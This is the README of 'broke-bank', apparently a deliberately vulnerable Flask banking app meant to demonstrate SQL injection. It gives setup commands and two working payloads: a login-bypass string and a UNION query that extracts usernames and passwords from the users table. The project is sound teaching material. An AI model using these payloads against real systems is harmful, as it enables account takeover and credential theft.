# broke-bank
SQL injection demo

# Setup

1. Clone repository
```shell
git clone https://github.com/anilmawji/broke-bank.git; cd broke-bank
```

2. Create and activate virtual environment (optional, recommended)
```shell
python -m venv .venv      # Create virtual environment
source .venv/bin/activate # On macOS/Linux
.venv\Scripts\activate    # On Windows
```

2. Install dependencies
```shell
pip install -r requirements.txt
```

3. Start server (local deployment)
```shell
flask run
```

# SQL Injection Examples

Login form password (make sure to include the space at the end!)
```sql
a' or 1=1 -- 
```

Transaction history search bar
```sql
3' union select null, user_id, version(), username, user_password from users;
```
